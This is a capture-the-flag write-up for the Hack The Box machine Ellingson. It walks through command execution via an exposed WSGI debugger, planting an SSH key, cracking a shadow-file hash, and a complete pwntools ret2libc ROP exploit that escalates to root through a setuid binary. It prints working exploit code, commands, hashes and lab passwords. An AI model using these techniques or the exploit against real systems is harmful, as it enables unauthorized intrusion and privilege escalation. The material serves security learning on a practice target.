---
layout: menu
title: "HTB Ellingson"
description: "10.10.10.139 | 40 pts"
header-img: "boxes/screenshots/32_ellingson/ellingson.png"
tags: [hackthebox, htb, boot2root, writeup, write-up, linux, python-objects, whiskey, wsgi, wsgi-debugger, linux-group, unix-group, ret2libc, plt, got, pwntools-ssh, pwn-ssh, ellingson]
---

# <span style="color:red">HTB Ellingson (10.10.10.139)</span>

---

### TABLE OF CONTENTS

* [PART 1 : INITIAL RECON](#part-1--initial-recon)
* [PART 2 : PORT ENUMERATION](#part-2--port-enumeration)
  * [TCP PORT 80](#tcp-port-80)
* [PART 3 : EXPLOITATION](#part-3--exploitation)
* [PART 4 : GENERATE USER SHELL (hal)](#part-4--generate-user-shell-hal)
* [PART 5 : LATERAL MOVEMENT (hal -&gt; margo)](#part-5--lateral-movement-hal---margo)
* [PART 6 : PRIVILEGE ESCALATION (margo -&gt; root)](#part-6--privilege-escalation-margo---root)
  * [ltrace](#ltrace)
  * [Program Flow](#program-flow)
  * [The <strong>auth()</strong> function:](#the-auth-function)
  * [exploit.py (Finding the right offset)](#exploitpy-finding-the-right-offset)
  * [exploit.py (Leaking the address of a libc function)](#exploitpy-leaking-the-address-of-a-libc-function)
  * [exploit.py (Write "/bin/sh" to a data segment)](#exploitpy-write-binsh-to-a-data-segment)
  * [exploit.py (Calculate the libc offsets)](#exploitpy-calculate-the-libc-offsets)
  * [exploit.py (Putting everything together)](#exploitpy-putting-everything-together)
  * [exploit.py (Running the exploit)](#exploitpy-running-the-exploit)

---

## PART 1 : INITIAL RECON

```console
$ nmap --min-rate 15000 -p- -v 10.10.10.139

  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

$ nmap -p 22,80 -sC -sV -T4 10.10.10.139

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
  |   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
  |_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
  80/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  | http-title: Ellingson Mineral Corp
  |_Requested resource was http://10.10.10.139/index
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

---

## PART 2 : PORT ENUMERATION

### TCP PORT 80

![Landing Page](./screenshots/32_ellingson/80_landing_page.png)

The landing page leads to a website for <span style="color:red">Ellingson Mineral Corp</span> which includes three articles and the faces behind the Company (Hal, Margo, Eugene, and Duke). This is clearly a reference to the 1995 film, [Hackers](https://en.wikipedia.org/wiki/Hackers_(film)).

![Suspicious Network activity](./screenshots/32_ellingson/80_article_3.png)

One of the articles posted is entitled "Suspicious Network activity" where it writes:

> We have recently detected suspicious activity on the network. Please make sure you change your password regularly and read my carefully prepared memo on the most commonly used passwords. Now as I so meticulously pointed out the most common passwords are. Love, Secret, Sex and God -The Plague

The articles are accessed throught the __`/articles`__ directory then followed by an __id__ or __index__ (e.g. __`/articles/3`__).

---

## PART 3 : EXPLOITATION

![builtins.IndexError](./screenshots/32_ellingson/80_wsgi_error.png)

Attempting to load a non-existent article using an __*index*__ that is too large or too small redirects the user to a <span style="color:orange">WSGI error page</span>. WSGI (Web Server Gateway Interface) serves as a middleware that handles requests between the web server and the web application.

![RCE](./screenshots/32_ellingson/80_wsgi_rce.png)

The error page can also serve as an interactive debugger which you can leverage for command execution. Maybe this could be used to gain a reverse shell or plant an __*RSA public key*__ to gain persistent access over __*ssh*__.

---

## PART 4 : GENERATE USER SHELL (hal)

Using the command execution over the WSGI debugger:

```py
>>> cmd = "cat /etc/passwd | egrep -e *sh$"
>>> __import__("subprocess").Popen(cmd, shell=True, stdout=-1).communicate()[0].decode("unicode_escape")

  root:x:0:0:root:/root:/bin/bash
  theplague:x:1000:1000:Eugene Belford:/home/theplague:/bin/bash
  hal:x:1001:1001:,,,:/home/hal:/bin/bash
  margo:x:1002:1002:,,,:/home/margo:/bin/bash
  duke:x:1003:1003:,,,:/home/duke:/bin/bash

>>> cmd = "ls -lah /home/hal"
>>> __import__("subprocess").Popen(cmd, shell=True, stdout=-1).communicate()[0].decode("unicode_escape")

  total 36K
  drwxrwx--- 5 hal  hal  4.0K May  7 13:12 .
  drwxr-xr-x 6 root root 4.0K Mar  9  2019 ..
  -rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout
  -rw-r--r-- 1 hal  hal  3.7K Mar  9  2019 .bashrc
  drwx------ 2 hal  hal  4.0K Mar 10  2019 .cache
  drwx------ 3 hal  hal  4.0K Mar 10  2019 .gnupg
  -rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile
  drwx------ 2 hal  hal  4.0K Mar  9  2019 .ssh
  -rw------- 1 hal  hal   865 Mar  9  2019 .viminfo

>>> cmd = "echo -e '\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf5LWxsMSacl9zZMA02V7umX21MZ/eIhYCS+iwa9coGiOEWsHO8h2iuDTrOPlg4HSlYx7pgkBe0oPHyorSLYXWHiXQyYqgcS60f1KTmd18hdo15YVReSgk4ZUM7t4j8rj/QqLiypb0cRJMGClWotbNr8UzaYvytl1X0t6z0LVAvC0VHNVqBi/FPjYVrn184ddP0uh1BKDPp2kPvE4Xlnm6D7jUXr72q/kEhB5EbnNNRBi6Dy1gMPQQQTUh1pI4M3yIbAyWvNS6SvLhIOqh76v7cQPI+aX557I+epxxT2B+RsQYW4TjA4fvvAQyktlL39dXzdDn2AXiVyVHDEL68uoMxwbRaz2aGhq0R0l7KZoHqd4sDda8U8vSPTEyofjPDXRUQWYBDsfpn1JHm+bvjXhCli2Mjgwc+Ep0jwSB8oJCiP5l7fi90VmbqKKYKQxLE1oEGBCHfZnNvl6oMnp8nzwUJDtO22yutNggIHeHh8SkVcrdlApospeKIRFTlAOrvyE= root@kali' >> /home/hal/.ssh/authorized_keys"
>>> __import__("subprocess").Popen(cmd, shell=True, stdout=-1).communicate()[0].decode("unicode_escape")
```

Now that a public key has been added to __*.ssh/authorized_keys*__, attempt to login via ssh using an identity file:

```console
$ ssh -i id_rsa -l hal 10.10.10.139

hal@ellingson:~$  id

  uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)

```

The user, __`hal`__, is also part of the __`4(adm)`__ group.

---

## PART 5 : LATERAL MOVEMENT (hal -> margo)

While inside __`hal`__'s shell:

```console
hal@ellingson:~$  find /var -gid 4 2>/dev/null

  /var/backups/shadow.bak
  ...omitted...

hal@ellingson:~$  cat /var/backups/shadow.bak

  root:*:17737:0:99999:7:::
  ...omitted...
  theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
  hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
  margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
  duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::

```

The __`adm`__ group has read permissions for the __`shadow.bak`__ file stored in __`/var/backups`__. It contains password hashes for all the members of the __*Ellingson*__ team.

In the movie referenced by the box, Margo Wallace failed to change her password according to a schedule and her password coincidentally was "GOD" which according to Plague was one of the most commonly used passwords (along with Love, Sex, and Secret) which resulted in their system to be compromised.

Cracking Margo's password hash is probably the next step forward:

```console
$ echo \$6\$Lv8rcvK8\$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1 > margo_hash

$ cat /usr/share/wordlists/rockyou.txt | egrep -ie "^.*g[o0]d.*$" > wordlist_god

$ john --wordlist=wordlist_god margo_hash

  iamgod$08        (?)

```

Since __*SHA512 crypt*__ hashes takes a while to crack, limiting the size of the wordlist is recommended. Also, since there is a context on what Margo's password might be, I created a subset of __rockyou.txt__ to only include passwords that contains variations of the string __god__. The cracked password serves as both UNIX and SSH credentials for the user, __`margo`__.

```console
hal@ellingson:~$  su margo
Password: iamgod$08

margo@ellingson:/home/hal$  id

  uid=1002(margo) gid=1002(margo) groups=1002(margo)

margo@ellingson:/home/hal$  cd ~

margo@ellingson:~$  ls -lah

  total 52K
  drwxrwx--- 6 margo margo 4.0K Mar 10  2019 .
  drwxr-xr-x 6 root  root  4.0K Mar  9  2019 ..
  -rw-r--r-- 1 margo margo  220 Mar  9  2019 .bash_logout
  -rw-r--r-- 1 margo margo 3.7K Mar  9  2019 .bashrc
  drwx------ 2 margo margo 4.0K Mar 10  2019 .cache
  drwx------ 3 margo margo 4.0K Mar 10  2019 .gnupg
  drwxrwxr-x 3 margo margo 4.0K Mar 10  2019 .local
  -rw-r--r-- 1 margo margo  807 Mar  9  2019 .profile
  drwx------ 2 margo margo 4.0K Mar  9  2019 .ssh
  -r-------- 1 margo margo   33 Mar 10  2019 user.txt
  -rw------- 1 margo margo 9.4K Mar 10  2019 .viminfo

margo@ellingson:~$  cat user.txt

  d0ff........................5903

```

---

## PART 6 : PRIVILEGE ESCALATION (margo -> root)

```console
margo@ellingson:~$  find /bin /usr/bin -uid 0 -perm -4000 -type f 2>/dev/null

  ...omitted...
  /usr/bin/garbage
  ...omitted...

```

Attempting to run the binary as another user (aside from margo) would return the following message:

```console
hal@ellingson:~$  /usr/bin/garbage

  User is not authorized to access this application. This attempt has been logged.

```

Otherwise:

```console
margo@ellingson:~$  /usr/bin/garbage

  Enter access password: iamgodod$08

  access denied.

```

### ltrace

Check the program flow (i.e. syscalls, function arguments, signals) using __`ltrace`__. The password comparison might just be done using __`strcmp()`__. 

```console
margo@ellingson:~$  ltrace /usr/bin/garbage

  getuid()                                                        = 1002
  syslog(6, "user: %lu cleared to access this"..., 1002)          = <void>
  getpwuid(1002, 0x7a0030, 0x7a0010, 1)                           = 0x7f1052bf2f20
  strcpy(0x7ffe34be6a44, "margo")                                 = 0x7ffe34be6a44
  printf("Enter access password: ")                               = 23
  gets(0x7ffe34be69e0, 0x7a1b90, 0, 0Enter access password: 
  )                            = 0x7ffe34be69e0
  putchar(10, 0x7a1fa0, 0x7f1052bf28d0, 0x7f1052915081
  )           = 10
  strcmp("", "N3veRF3@r1iSh3r3!")                                 = -78
  puts("access denied."access denied.
  )                                          = 15
  exit(-1 <no return ...>
  +++ exited (status 255) +++

```

Aaaaaand the password checking is indeed done by using __`strcmp("", "N3veRF3@r1iSh3r3!")`__.

```console
margo@ellingson:~$  /usr/bin/garbage

  Enter access password: N3veRF3@r1iSh3r3!

  access granted.
  [+] W0rM || Control Application
  [+] ---------------------------
  Select Option
  1: Check Balance
  2: Launch
  3: Cancel
  4: Exit
  > 1
  Balance is $1337
  > 2
  Row Row Row Your Boat...
  > 3
  The tankers have stopped capsizing
  > 4

```

Trying to access the __`garbage`__ binary again with the right password leads to a control panel and all options just outputs a string and are not interactive. If this were a buffer overflow vulnerability, then the only attack vectors left are the <strong style="color:red">password input</strong> and the <strong style="color:red">option selection input</strong>.

Now, it's time to save the binary locally and attempt to create an exploit:

```console
$ scp margo@10.10.10.139:/usr/bin/garbage ./garbage
$ margo@10.10.10.139's password: iamgod$08

  garbage                                                                100%

$ file ./garbage

  ./garbage: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped

$ gdb --nh -q ./garbage

(gdb) checksec

  Canary                        : No
  NX                            : Yes
  PIE                           : No
  Fortify                       : No
  RelRO                         : Partial

(gdb) disassemble main

  0x0000000000401619 <+0>:	push   rbp
  0x000000000040161a <+1>:	mov    rbp,rsp
  0x000000000040161d <+4>:	sub    rsp,0x10
  0x0000000000401621 <+8>:	mov    eax,0x0
  0x0000000000401626 <+13>:	call   0x401459 <check_user>
  0x000000000040162b <+18>:	mov    DWORD PTR [rbp-0x4],eax
  0x000000000040162e <+21>:	mov    eax,DWORD PTR [rbp-0x4]
  0x0000000000401631 <+24>:	mov    edi,eax
  0x0000000000401633 <+26>:	call   0x4014d4 <set_username>
  0x0000000000401638 <+31>:	mov    eax,DWORD PTR [rbp-0x4]
  0x000000000040163b <+34>:	mov    edi,eax
  0x000000000040163d <+36>:	call   0x401513 <auth>   
  ...omitted...
  0x00000000004016e7 <+206>:	mov    eax,0x0
  0x00000000004016ec <+211>:	call   0x40133c <checkbalance>
  0x00000000004016f1 <+216>:	jmp    0x40172b <main+274>
  0x00000000004016f3 <+218>:	mov    eax,0x0
  0x00000000004016f8 <+223>:	call   0x401316 <launch>
  0x00000000004016fd <+228>:	jmp    0x40172b <main+274>
  0x00000000004016ff <+230>:	mov    eax,0x0
  0x0000000000401704 <+235>:	call   0x401329 <cancel>
  0x0000000000401709 <+240>:	jmp    0x40172b <main+274>
  0x000000000040170b <+242>:	mov    edi,0x0
  0x0000000000401710 <+247>:	call   0x401160 <exit@plt>
  0x0000000000401715 <+252>:	lea    rdi,[rip+0xaf8]        # 0x402214
  0x000000000040171c <+259>:	call   0x401050 <puts@plt>
  0x0000000000401721 <+264>:	mov    edi,0xffffffff
  0x0000000000401726 <+269>:	call   0x401160 <exit@plt>
  0x000000000040172b <+274>:	jmp    0x40169e <main+133>
  0x0000000000401730 <+279>:	mov    edi,0xffffffff
  0x0000000000401735 <+284>:	call   0x401160 <exit@plt>

```

__`/usr/bin/garbage`__ is a <span style="color:orange">64-bit</span> ELF executable with <span style="color:orange">ASLR (Address Space Layout Randomization)</span> enabled which means that certain modules or libraries (especially the __libc.so__ file) are offset randomly every instance generated. Its security features include only NX (non-executable segment) protection and Partial RelRO (Relocation Read-Only).

<span style="color:orange">NX (Non-execute)</span>
> The application, when loaded in memory, does not allow any of its segments to be both writable and executable. The idea here is that writable memory should never be executed (as it can be manipulated) and vice versa.

<span style="color:orange">Partial RelRO (Relocation Read-Only)</span>
> The headers in your binary, which need to be writable during startup of the application (to allow the dynamic linker to load and link stuff like shared libraries) are marked as read-only when the linker is done doing its magic (but before the application itself is launched)

### Program Flow

<table>
<tr>
  <td>#1</td>
  <td>Checks User ID [ check_user() ]</td>
  <td><span style="color:green">if uid==1002 or uid==0: <span style="text-decoration:underline">GO TO #2</span></span><br/><span style="color:red">if uid==1000: exit()</span></td>
</tr>
<tr>
  <td>#2</td>
  <td>Authentication [ auth() ]</td>
  <td><span style="color:green">if password=="N3veRF3@r1iSh3r3!": <span style="text-decoration:underline">GO TO #3</span></span><br/><span style="color:red">else: exit()</span></td>
</tr>
<tr>
  <td>#3</td>
  <td>Select Option</td>
  <td><span style="color:green">if option==1: checkbalance(); <span style="text-decoration:underline">GO TO #3</span><br/>if option==2: launch(); <span style="text-decoration:underline">GO TO #3</span><br/>if option==3: cancel(); <span style="text-decoration:underline">GO TO #3</span></span><br/><span style="color:red">else: exit()</span></td>
</tr>
</table>

### The __auth()__ function:

```sh
(gdb) disassemble auth

  ...omitted...
  0x0000000000401558 <+69>:	lea    rax,[rbp-0x80]
  0x000000000040155c <+73>:	mov    rdi,rax
  0x000000000040155f <+76>:	mov    eax,0x0
  0x0000000000401564 <+81>:	call   0x401100 <gets@plt>
  0x0000000000401569 <+86>:	mov    edi,0xa
  0x000000000040156e <+91>:	call   0x401030 <putchar@plt>
  0x0000000000401573 <+96>:	lea    rax,[rbp-0x80]
  0x0000000000401577 <+100>:	lea    rsi,[rip+0xbe1]        # 0x40215f
  0x000000000040157e <+107>:	mov    rdi,rax
  0x0000000000401581 <+110>:	call   0x4010e0 <strcmp@plt>
  0x0000000000401586 <+115>:	test   eax,eax
  0x0000000000401588 <+117>:	jne    0x401606 <auth+243>
  ...omitted...
  0x0000000000401606 <+243>:	lea    rdi,[rip+0xb74]        # 0x402181
  0x000000000040160d <+250>:	call   0x401050 <puts@plt>
  0x0000000000401612 <+255>:	mov    eax,0x0
  0x0000000000401617 <+260>:	leave  
  0x0000000000401618 <+261>:	ret

```

In creating 64-bit ROP chains, the value of the <span style="color:orange">$rdi</span> register can be used to pass a first argument to a function (followed by <span style="color:orange">$rsi</span>, <span style="color:orange">$rdx</span>, <span style="color:orange">$rcx</span>, <span style="color:orange">$r8</span>, then <span style="color:orange">$r9</span>). To summarize the code snippet above, the address __`[rbp-0x80]`__ is saved to __`$rax`__ which is then moved to __`$rdi`__. __`[rbp-0x80]`__ is now the effective address where the function call __`gets@plt`__ will save the input from STDIN.

External function calls such as __`gets@plt`__ are using dynamic linkers (e.g. __ld.so__) to resolve the address of __`libc`__ functions during run-time and are saved to the <span style="color:orange">GOT (Global Offset Table)</span>. The __GOT__ serves as a reference for all external function calls or anything that is referenced to a shared library then the <span style="color:orange">PLT (Procedure Linkage Table)</span> serves as a means for the compiled executable to access such functions.

Since there is an address space that is writable (using __`gets@plt`__) and there is an easy way to view stored values (using __`puts@plt`__), it could be used to leak addresses from the libc.so file required by the executable to gain total control over the binary in order to gain command execution.

### exploit.py (Finding the right offset)

```py
payload = ""
payload += "A" * int("0x80", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += "C" * 8                      # RETURN ADDRESS PLACEHOLDER
```
```sh
(gdb) break * 0x0000000000401569  # function call after gets@plt

  Breakpoint 1 at 0x401569

(gdb) break * 0x0000000000401618  # auth() function's return call

  Breakpoint 1 at 0x401618

(gdb) run <<< $(python -c 'print "A"*int("0x80",16) + "B"*8 + "C"*8')

(gdb) x/18xg $rbp-0x80

  0x7ffddfc8e0b0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0c0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0d0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0e0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e0f0: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e100: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e110: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e120: 0x4141414141414141	0x4141414141414141
  0x7ffddfc8e130: 0x4242424242424242	0x4343434343434343

(gdb) c

(gdb) x/xg $rsp

  0x7ffd9762c1f8: 0x4343434343434343

```

The address space where the user inputs a password for authentication is stored in __`[rbp-0x80]`__. Since the return address is, in this case, 8 bytes away from the base pointer, writing 8 bytes beyond __`[rbp-0x80]`__ would overwrite the value of __`$rbp`__ and another 8 bytes would overwrite the return address.

The __`return`__ call of the __`auth()`__ function is now overwritten to be __`CCCCCCCC`__ or __`4343434343434343`__

### exploit.py (Leaking the address of a libc function)

```console
$ ropper --file ./garbage --search "% ?di"

  ...omitted...
  0x000000000040179b: pop rdi; ret;

```
```sh
(gdb) info functions

  ...omitted...
  0x0000000000401050  puts@plt
  ...omitted...
  0x0000000000401100  gets@plt
  ...omitted...
  0x0000000000401619  main
  ...omitted...

(gdb) disassemble 0x0000000000401050

  0x0000000000401050 <+0>:	jmpq   *0x2fd2(%rip)        # 0x404028 <puts@got.plt>
  0x0000000000401056 <+6>:	pushq  $0x2
  0x000000000040105b <+11>:	jmpq   0x401020

```
```py
from pwn import *

pwnable = process("./garbage")

payload = ""
payload += "A" * int("0x80", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40179b)                # pop rdi; ret;
payload += p64(0x404028)                # puts@got.plt
payload += p64(0x401050)                # puts@plt
payload += p64(0x401619)                # main <+0>

pwnable.sendline(payload)
pwnable.recvuntil("denied.\n")
puts_leaked = pwnable.recvline()[:8].strip().ljust(8, "\x00")
```

This process sets the value of __`$rdi`__ to be the address of __`puts@got.plt`__ directly offset from the libc shared object. __`$rdi`__ then gets passed as an argument to the function, __`puts@plt`__ then output to STDOUT. This process is essential to be able to infer the libc version being used by the infected machine (ellingson). 

The exploit returns back to the main function. Since the executable is still running, the libc dynamically linked to the executable is still in the same address which means that the address leaked using the exploit above is still useful. The process of creating a ROP payload then returning to __`main`__ can be repeated until all preparations to achieve command execution are completed.

### exploit.py (Write "/bin/sh" to a data segment)

```console
$ objdump -h ./garbage

  Sections:
  Idx Name          Size      VMA               LMA               File off  Algn
  ...omitted...
   22 .data         00000014  00000000004040b8  00000000004040b8  000030b8  2**3
                    CONTENTS, ALLOC, LOAD, DATA
   23 .bss          00000018  00000000004040d0  00000000004040d0  000030cc  2**4
                    ALLOC
  ...omitted...

$ objdump -j .data -s ./garbage

  Contents of section .data:
   4040b8 00000000 00000000 00000000 00000000  ................
   4040c8 39050000                             9...

```
```py
from pwn import *

pwnable = process("./garbage")

payload = ""
payload += "A" * int("0x80", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40179b)                # pop rdi; ret;
payload += p64(0x4040b8)                # .data segment
payload += p64(0x401100)                # gets@plt
payload += p64(0x401619)                # main <+0>

pwnable.sendline(payload)

shell = "/bin/sh"
pwnable.sendline(shell + "\x00"*(8-(len(shell)%8)))
```

<strong style="color:orange">.data segment</strong>
>  a portion of an object file or the corresponding virtual address space of a program that contains initialized static variables, that is, global variables and static local variables. The size of this segment is determined by the size of the values in the program's source code, and does not change at run time.
>
> The data segment is read-write, since the values of variables can be altered at run time. Uninitialized data, both variables and constants, is instead in the BSS segment.

The string __`/bin/sh`__ was written in the .data segment (which was otherwise basically empty).

### exploit.py (Calculate the libc offsets)

```console
margo@ellingson:~$  ldd /usr/bin/garbage

  linux-vdso.so.1 (0x00007ffc77ffb000)
  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f370379e000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f3703b8f000)

$ scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
$ margo@10.10.10.139's password: iamgod$08

  libc.so.6                                                              100% 1983KB

```
```py
from pwn import *

libc = ELF("./libc.so.6")
libc_address = u64(puts_leaked) - libc.symbols['puts']

GLIBC_setuid = libc_address + libc.symbols['setuid']
GLIBC_system = libc_address + libc.symbols['system']
GLIBC_exit = libc_address + libc.symbols['exit']

payload = ""
payload += "A" * int("0x80", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40179b)		# pop rdi; ret;
payload += p64(0)			# integer, 0
payload += p64(GLIBC_setuid)
payload += p64(0x40179b)                # pop rdi; ret;
payload += p64(0x4040b8)                # .data segment
payload += p64(GLIBC_system)
payload += p64(GLIBC_exit)
```

The base address of the __libc__ is calculated by removing the offset of the leaked __`puts`__ address. Knowing the base address of the libc used during run-time means you can call the functions you want with the right offsets. The offsets of each libc function are constant in their respective versions and architecture which could pretty much be easily computed.

### exploit.py (Putting everything together)

```py
from pwn import *

shell = ssh("margo", '10.10.10.139', password="iamgod$08")
pwnable = shell.process("/usr/bin/garbage")

# ==================================================================

payload = ""
payload += "A" * int("0x80", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40179b)                # pop rdi; ret;
payload += p64(0x404028)                # puts@got.plt
payload += p64(0x401050)                # puts@plt
payload += p64(0x401619)                # main <+0>

pwnable.sendline(payload)
pwnable.recvuntil("denied.\n")
puts_leaked = pwnable.recvline()[:8].strip().ljust(8, "\x00")

log.success("LEAKED ADDRESS puts@got.plt : {}".format(hex(u64(puts_leaked))))

# ==================================================================

payload = ""
payload += "A" * int("0x80", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40179b)                # pop rdi; ret;
payload += p64(0x4040b8)                # .data segment
payload += p64(0x401100)                # gets@plt
payload += p64(0x401619)                # main <+0>

pwnable.sendline(payload)

shell = "/bin/sh"
pwnable.sendline(shell + "\x00"*(8-(len(shell)%8)))
pwnable.recvuntil("denied.\n")

log.success("\"{}\" WAS WRITTEN ON {}".format(shell, hex(int("0x4040b8", 16))))

# ==================================================================

libc = ELF("./libc.so.6")
libc_address = u64(puts_leaked) - libc.symbols['puts']

GLIBC_setuid = libc_address + libc.symbols['setuid']
GLIBC_system = libc_address + libc.symbols['system']
GLIBC_exit = libc_address + libc.symbols['exit']

payload = ""
payload += "A" * int("0x80", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40179b)		# pop rdi; ret;
payload += p64(0)			# integer, 0
payload += p64(GLIBC_setuid)
payload += p64(0x40179b)                # pop rdi; ret;
payload += p64(0x4040b8)                # .data segment
payload += p64(GLIBC_system)
payload += p64(GLIBC_exit)

log.info("setuid() : {}".format(hex(GLIBC_setuid)))
log.info("system() : {}".format(hex(GLIBC_system)))
log.info("exit()   : {}".format(hex(GLIBC_exit)))

pwnable.sendline(payload)
pwnable.recvuntil("denied.\n")
pwnable.interactive()
```

### exploit.py (Running the exploit)

```console
$ python exploit.py

  [+] Connecting to 10.10.10.139 on port 22: Done
  [*] margo@10.10.10.139:
      Distro    Ubuntu 18.04
      OS:       linux
      Arch:     amd64
      Version:  4.15.0
      ASLR:     Enabled
  [+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 41256
  [+] LEAKED ADDRESS puts@got.plt : 0x7ff860e879c0
  [+] "/bin/sh" WAS WRITTEN ON 0x4040b8
  [*] './libc.so.6'
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      PIE enabled
  [*] setuid() : 0x7ff860eec970
  [*] system() : 0x7ff860e56440
  [*] exit()   : 0x7ff860e4a120
  [*] Switching to interactive mode
  # $ id
  uid=0(root) gid=1002(margo) groups=1002(margo)
  # $ cat /root/root.txt
  1cc7........................f997
  # $ 

```

Without setting the __uid__ to __0__, the effective uid would still be __1002__ which is still __`margo`__'s uid.

---

### REFERENCES
- https://en.wikipedia.org/wiki/Hackers_(film)
- http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/
- https://en.wikipedia.org/wiki/Data_segment





































  

